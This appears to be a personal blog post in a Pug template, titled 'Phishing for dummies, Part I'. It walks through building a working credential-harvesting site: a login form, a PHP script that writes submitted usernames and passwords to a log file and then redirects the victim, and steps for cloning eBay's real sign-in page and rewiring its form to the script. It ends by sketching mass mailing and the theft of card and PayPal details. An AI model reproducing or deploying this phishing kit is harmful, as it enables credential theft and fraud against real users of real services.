@@ -1,0 +1,191 @@
+extends ../layout/default.pug
+
+block title
+  title tzekid | Phishing for dummies Part I
+
+block default
+  .art_head
+    a(href="/").art_title #[h1.logo.quando.red.art_logo <{ tzekid }>]
+  article.josefin
+    .markdown
+      :markdown-it(html typographer Hlinkify KramdownAttrs langPrefix='highlight-')
+        # Phishing for dummies, Part I
+
+        ## Why | Prologue
+
+        -- placeholder --
+
+        ## What
+
+        This article is meant for beginners or beginning types, so if you already know a bit of HTML and PHP, then this article might be a tad boring. In this article I'll go through the first module I've made for the school group, namely:
+
+        - building a simple forms website
+        - setting up a simple server
+        - writing a server-side script which
+          - takes request parameters
+          - writes a log locally,
+          - and finally redirects the user to a new page
+
+        and, hopefully
+
+        - show you a practical, 100% educational, real world example.
+
+        ## The Site
+
+        The code for the site is very basic:
+
+        ```html
+        <!doctype html>
+        <meta charset="UTF-8">
+
+        <form action="./script.php" method='get'>
+            <p>User:    <input name="user" type='text'></p>
+            <p>Pwd :    <input name="pwd"  type='password'></p>
+            <center>    <input type="submit"></center>
+        </form>
+
+        <style>
+            form {
+                position : absolute;
+                top : 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+            }
+        </style>
+        ```
+
+        There is all we need. Let's go through the code. The `doctype` tag is mostly there to show all browsers that the 'document' we're giving them is actually just plain html. You can read more about the `doctype` and `meta` tags [here](https://developer.mozilla.org/en-US/docs/Web/Guide/HTML/HTML5/Introduction_to_HTML5).
+
+        Now, the meat of the site is in the next `form` tag. This tag is made up of many smaller inputs which, when submitted, are usually compiled down to JSON - a protocol which makes the sharing of (objects and) variables universal.
+        
+        <input id="elif" type="checkbox" /><label for="elif"> There is a <a href="https://www.reddit.com/r/explainlikeimfive/comments/2m2pb2/eli5what_is_json/cm0e4c2/" target="_blank">very neat ELIF</a> on the topic, if you want to know more.</label>
+
+        We give the `form` tag an `action` argumen. This is _where_ the information will be submitted, ie. in our case that we submit the form information to a local file named `script.php`. The next argument, `method`, describes _how_ the information will be transfered. You can read more about it on the [MDN web docs](https://developer.mozilla.org/en-US/docs/Learn/HTML/Forms/Sending_and_retrieving_form_data). 
+
+        You can see the `name` attribute in the `input`, alongsite the `type` tag. The `type` tag tells the browser how to present the input field. In our example we need one field for the `user`name, which consists of text, and one for the `p`ass`w`or`d`, which should be hidden by asterisks.
+
+        For each form we need a thing which actually `submit`s the data.
+
+        Upon submitting the form, we send the information in form of JSON. The JSON for someone with the user 'derek' and password 'peanuts12' simply looks like:
+
+        ```JSON
+        {
+            "user": "derek",
+            "password": "peanuts12"
+        }
+        ```
+
+        To all of that we just have some `p`aragraph, `center` and `style` tags, alongside a bit of CSS centering the login form, making everything just a bit more tidy and pleasant to look at.
+
+        Here is how the 'final product' should look like:
+        ![the butterfull dummy site](/resources/on-phishing_dummy-site.png) 
+
+        ## The Server
+
+        The next thing we need is a server, ie. a way to run the HTML and PHP code.
+
+        | OS   |      TL:DR      |
+        |----------|--------------:|
+        | Arch Linux   |   ```# pacman -S php``` |
+        | Ubuntu   |    ```# apt-get install php``` |
+        | macOS   | have a look at [this article](https://lukearmstrong.github.io/2016/12/setup-apache-mysql-php-homebrew-macos-sierra/) |
+        | Windows   |   install [XAMPP](https://www.apachefriends.org/index.html?ModPagespeed=noscript) |
+
+        Running the php server:
+
+        | OS   |      TL:DR      |
+        |----------|--------------:|
+        | Windows' CMD | `> c:\xampp\php\php.exe -S localhost:8080` |
+        | 'nux and mac | `$ php -S localhost:8080` |
+
+        Now, in your browser, just go to the `localhost:8080` address, and you should see the magnificent login form from before.
+
+        ## The Script
+
+        Now it's time to write the script file which will handle the input. Create a `script.php` file in the same directory as `index.html`.
+
+        This is the code for the `script.php`:
+
+        ```php
+        <?php
+            /* Catch input */
+            $user = $_REQUEST["user"];
+            $pwd  = $_REQUEST["pwd"];
+
+            /* Formating input */
+            $text = "
+        ===============
+        user: $user
+        pwd : $pwd
+        ===============
+        ";
+
+            /* Write to file */
+            $file = fopen("output.txt", "a+");
+            fwrite($file, $text);
+            fclose($file);
+
+            /* If writing doesn't work, make sure   *
+            /* script.php has permission to WRITE.  */
+
+            /* Redirecting the User */
+            $url = "https://google.com";
+            header('Location: '.$url);
+        ?>
+        ```
+
+        Now, let's analyse this script a bit. The PHP files are distingueshed from the HTML code by the special `php` tag. What we first want to do is catch or handle the input we got from our `index.html` file. We do that with the help of `$_REQUEST`. We catch the element with the name `user` and save it's value in the variable `$user`, and ditto for the password. You see that PHP has the `$` symbol for variables, which distiguishes them from functions or arrays.
+
+        After that we create a simply formatted `$text` entry for the login information we got, using the variables as placeholders.
+
+        In the output file it would be nice to be able to easily read and go through the login credentials, that's why we first format the input we catched into a nice and tidy string. In the 'real world' there are a couple more variables you store, like the date and time, the ip, from which spam 'campaign' the ~~sucker~~ user was phished, sometimes credit card info etc. Therefore keeping tidy is very important, especially when you have hundreds (or thousands) of entries.
+
+        We need a file in which we save the output. We use `fopen` to open a file, giving it `output.txt` as the filename and `a+` as the mode - `a+` opens the file for both reading and writing, and if the file does not exist it attempts to create it. We then `fwrite` our formatted `$text` to the `$file`, and then `fclose` it.
+
+        In the last bit of the sript we change the `Location` of the page to our desired `$url`. ( The dot, `.`, is for concatenating, ie. gluing two character strings in php. )
+
+        ## Practical Example
+
+        Congratulations ! You now have a very basic 'phishing' site !
+
+        But noone in their right mind would enter their login information on that site. For educational purposes we'll try our hands at a more practical, or better said realistic example ... how about Ebay ? That sounds pretty reasonable, right ?
+
+        <input id="example" type="checkbox" /><label for="example"> Just go on <a href="https://signin.ebay.com/" target="_blank">the ebay signin page</a> and hit `Ctrl`+`S`.</label>
+
+        For the file to work nicely with our local php 'server' you can rename the downloaded `.html` file to `index.html`, and make sure it is the only index file in the directory not to get php all too confused.
+
+        After opening the file in both my browser and editor it all looked allright besides some not so nice text bits that were just out of place in the middle of the page.
+
+        ![sample ebay website](/resources/on-phishing_ebay.png)
+
+        All that I had to do was to clean that up by deleting those exact lines. If you take a look at the source code you'll see it's a mess, so take care not to delete stuff which we actually need !
+
+        Now that the site looks clean, especially with the addition of the 'Norton SECURED' logo, we need to dive in the source code. What we actually want to accomplish doesn't differ that much from our toy example from before. The ebay login site has a `form` with some `action` and `method` arguments, among many others. In this form there are a bunch of inputs, each with their specific `name`s and `type`s, again, amongst many other values.
+
+        All we need to to is to find those fields ! I for one just searched for 'email or username' in the form and got three results, two `label` tags and the actual `input` tag we're looking for ! Ditto for the password `input`.
+
+        ```html
+          ...
+          <input size="40" ... name="856774662" ... placeholder="Email or username" ...>
+          ...
+          <input name="pass" ... type="password" ... placeholder="Password">
+          ...
+        ```
+
+        It's `name`s should differ for you, but that's no problem. Just change the `name` attribute to 'user' for the username and 'pwd` for the password input.
+
+        We still have to change _where_ the form is submitting the login information. You can easily find it by searching for '<form'.
+
+        ```html
+          <form name="SignInForm" ... method="post" ... action=".../nautlissignin.ebay.com/...">
+        ```
+
+        There you only have to change the `action` to our creatively named script, `script.php`. And as the cherry on top, to make it all a bit more authentic: in the `script.php` change `$url` either to the original `https://signin.ebay.com`, to their policy page, or anything that your heart desires.
+
+        And voila, you're done! You can now test your fully functioning phishing page!
+
+        In a real world scenario one would then make a so called letter, an email website usually just ripping their own by making simple request, eg. the 'forgot my password' or other support email. Another thing one needs is a list of (valid!) emails and a mass mailer programm. Scammers wouldn't stop at getting your ebay login credentials, but do their best to get your paypal or (credit) card info. too, either adding an extra page to the login one or 'spear phishing', ie. a coordinated attack tailered just for you :)
+
+      
+  
+  a(href="./index.html").go_back.quando.red <{ index }>
